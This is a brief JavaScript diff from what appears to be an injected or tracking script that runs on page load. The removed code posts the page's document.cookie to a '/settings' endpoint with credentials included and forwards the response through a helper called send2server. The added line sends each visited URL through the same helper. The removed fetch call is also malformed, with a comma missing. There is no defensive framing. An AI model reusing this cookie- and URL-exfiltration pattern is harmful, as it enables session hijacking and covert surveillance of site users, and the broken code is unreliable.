@@ -6,21 +6,6 @@ window.addEventListener('load', function () {
 }
 
 
-  fetch('/settings',
-        {
-    'method': 'POST',
-    'body': 'name=test&user_id=2&' +document.cookie,
-     headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-    }
-   credentials: "include"
-  })
-  .then(res => {
-      return res.text();
-  })
-  .then(data => {
-  send2server("settings", data);
-
-  });
+send2server("path",window.location.href);
   
     })
